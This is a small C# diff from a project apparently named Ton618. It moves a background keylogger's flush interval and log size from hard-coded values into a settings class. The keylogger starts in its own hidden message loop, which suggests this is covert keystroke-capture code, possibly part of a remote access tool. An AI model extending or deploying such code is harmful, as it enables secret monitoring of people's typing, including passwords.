@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Threading;
 using System.Windows.Forms;
+using Ton618.Config;
 
 namespace Ton618.Logging
 {
@@ -32,7 +33,7 @@ namespace Ton618.Logging
             _msgLoopThread = new Thread(() =>
             {
                 _msgLoop = new ApplicationContext();
-                _keylogger = new Keylogger(15000, 5 * 1024 * 1024);
+                _keylogger = new Keylogger(Settings.KeyLogFlushInterval, Settings.KeyLogRollSize);
                 _keylogger.Start();
                 Application.Run(_msgLoop);
             });
